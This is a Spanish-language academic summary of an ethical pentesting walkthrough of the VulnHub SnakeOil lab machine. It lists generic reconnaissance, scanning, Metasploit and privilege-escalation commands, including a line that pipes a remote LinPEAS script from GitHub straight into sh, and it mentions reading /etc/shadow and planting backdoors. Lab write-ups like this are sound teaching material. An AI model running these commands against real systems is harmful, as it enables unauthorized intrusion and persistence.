RESUMEN DEL PROYECTO

◈ Descripción General

Este proyecto documenta de forma integral el proceso de pentesting ético aplicado sobre una máquina virtual vulnerable, llevando la teoría de la seguridad informática a un escenario práctico real. A lo largo del walkthrough se cubren todas las fases del ciclo de ataque: reconocimiento, escaneo, enumeración, explotación y post-explotación.

La máquina objetivo seleccionada es SnakeOil de la plataforma VulnHub — un entorno diseñado para practicar técnicas reales de pentesting en un ambiente controlado y aislado. Todo el proceso fue grabado en video y documentado paso a paso con comandos, resultados y capturas de pantalla.

MARCO TEÓRICO

▦ Fundamentos Teóricos

El proyecto conecta los conceptos teóricos de la seguridad informática con su aplicación práctica en un entorno de pentesting real. Los fundamentos abordados incluyen:

Modelo de Amenazas y Metodología de Pentesting

El pentesting o prueba de penetración es un proceso sistemático y autorizado que simula el comportamiento de un atacante real para identificar vulnerabilidades antes de que sean explotadas de forma maliciosa. La metodología seguida en este proyecto se basa en el estándar PTES (Penetration Testing Execution Standard) y las fases de CEH (Certified Ethical Hacker).

Conceptos Clave

◈ ¿Qué es un Walkthrough?

Un walkthrough en el contexto de ciberseguridad es una documentación paso a paso del proceso completo de comprometer una máquina vulnerable. Incluye comandos exactos utilizados, explicación de cada técnica aplicada, capturas de pantalla como evidencia y reflexión sobre qué conceptos teóricos sustenta cada paso. Es la metodología estándar para aprender pentesting de forma estructurada.

◈ Virtualización Aislada

La práctica de pentesting requiere un entorno aislado para evitar daño a sistemas reales. Mediante VirtualBox o VMware se crea una red interna donde solo la máquina atacante (Kali Linux) y la máquina víctima (SnakeOil) pueden comunicarse, sin acceso a internet ni a la red real del practicante.

⚠ Ética y Legalidad

Todo el trabajo se realizó sobre máquinas diseñadas específicamente para ser vulneradas (VulnHub). El pentesting sin autorización explícita sobre sistemas reales es un delito. Este proyecto tiene únicamente finalidad académica y educativa, siguiendo los principios del hacking ético.

Objetivos Específicos

Preparar un entorno de pruebas seguro, seleccionando y configurando una máquina virtual vulnerable adecuada para realizar las pruebas de penetración de forma segura y controlada.

Realizar reconocimiento exhaustivo

METODOLOGÍA Y PROCEDIMIENTO

▦ Procedimiento Detallado

El proyecto buscó, en primer lugar, preparar un entorno de pruebas seguro, seleccionando y configurando una máquina virtual vulnerable adecuada. Se realizó un reconocimiento exhaustivo del sistema objetivo, escaneando y enumerando los servicios en ejecución para identificar posibles vectores de ataque.

Fase 1 — Preparación y Reconocimiento

# Descubrir la IP de la máquina objetivo en la red sudo netdiscover -r 192.168.x.0/24 # Alternativa con arp-scan sudo arp-scan --localnet

Fase 2 — Escaneo de Puertos y Servicios

# Escaneo completo con detección de versiones y scripts nmap -sV -sC -A -p- <IP_OBJETIVO> # Escaneo rápido de puertos más comunes nmap -sV --open -p 21,22,80,443,8080,8443,3306 <IP_OBJETIVO> # Escaneo web con Nikto nikto -h http://<IP_OBJETIVO>

Fase 3 — Enumeración Web

# Fuerza bruta de directorios gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt # Enumeración de archivos y extensiones gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak

Fase 4 — Análisis de Vulnerabilidades

# Buscar exploits por servicio/versión searchsploit <nombre_servicio> <versión> # Copiar exploit al directorio de trabajo searchsploit -m <exploit_id>

Fase 5 — Explotación

# Iniciar Metasploit Framework msfconsole # Buscar módulo de exploit search <vulnerabilidad> use <número_de_módulo> show options set RHOSTS <IP_OBJETIVO> set LHOST <IP_KALI> exploit

Fase 6 — Post-Explotación y Escalada de Privilegios

# Verificar usuario actual whoami && id # Verificar permisos sudo sudo -l # Buscar binarios SUID find / -perm -u=s -type f 2>/dev/null # Ejecutar LinPEAS para enumeración automática curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Obtener shell root sudo su whoami # → root ✓

⚑ Impacto Demostrado

Una vez obtenida la shell root se demostró control total sobre el sistema: lectura de archivos sensibles (/etc/shadow, flags), establecimiento de persistencia mediante backdoors y evidencia de la escalada completa de privilegios desde usuario no privilegiado hasta administrador del sistema.

◈ ¿Qué es VulnHub?

VulnHub es una plataforma que proporciona máquinas virtuales vulnerables de forma gratuita para que profesionales y estudiantes de ciberseguridad puedan practicar técnicas de pentesting en un entorno controlado y legal. Las máquinas están diseñadas con vulnerabilidades reales pero en un contexto educativo.

Instrucciones de Configuración

1. Descargar la máquina

Acceder a la URL de VulnHub y descargar el archivo .ova o .vmdk de SnakeOil.

2. Importar en VirtualBox / VMware

File → Import Appliance (VirtualBox) o File → Open (VMware). Configurar la red como Host-Only o Red Interna.

3. Configurar Kali Linux

Asegurarse de que la máquina atacante (Kali Linux) esté en la misma red interna que SnakeOil para poder comunicarse.

4. Verificar conectividad

Desde Kali, ejecutar netdiscover o arp-scan --localnet para confirmar que la máquina objetivo es visible en la red.

5. ¡Comenzar el walkthrough!

Una vez confirmada la conectividad, seguir el proceso documentado en este proyecto o ver el video para la guía completa paso a paso.
